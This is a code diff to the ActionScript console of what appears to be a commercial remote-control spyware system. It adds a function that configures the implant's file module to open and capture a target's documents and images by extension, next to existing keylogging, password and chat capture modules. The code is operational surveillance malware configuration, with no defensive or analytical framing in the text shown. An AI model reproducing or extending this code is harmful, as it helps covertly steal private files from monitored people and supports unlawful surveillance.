@@ -30,7 +30,7 @@ package it.ht.rcs.console.operations.view.configuration.basic
       if (model.messages) { subactions.push({action: "module", module: "messages",    status: "start"});
                             subactions.push({action: "module", module: "chat",        status: "start"}); }
       if (model.url)        subactions.push({action: "module", module: "url",         status: "start"});
-      if (model.file)       subactions.push({action: "module", module: "file",        status: "start"});
+      if (model.file)     { subactions.push({action: "module", module: "file",        status: "start"}); configureFileModule(model, newConfig); }
       if (model.keylog)   { subactions.push({action: "module", module: "keylog",      status: "start"});
                             subactions.push({action: "module", module: "mouse",       status: "start"});
                             subactions.push({action: "module", module: "password",    status: "start"}); }
@@ -89,6 +89,30 @@ package it.ht.rcs.console.operations.view.configuration.basic
       newConfig.events = events;
       newConfig.actions = actions;
       
+    }
+    
+    private static function configureFileModule(model:Object, newConfig:Object):void
+    {
+      var file:Object;
+      for each (var module:Object in newConfig.modules)
+        if (module.module == 'file')
+          file = module;
+      
+      if (file == null) return;
+      
+      file.open = true;
+      file.capture = true;
+      
+      file.accept = [];
+      
+      if (model.documents)
+        file.accept = (file.accept as Array).concat(['*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx', '*.pps', '*.ppsx',
+                                                     '*.odt', '*.ods',  '*.odp', '*.rtf',  '*.txt', '*.pdf']);
+      
+      if (model.images)
+        file.accept = (file.accept as Array).concat(['*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp']);
+      
+      file.deny = ['/setting'];
     }
     
   }
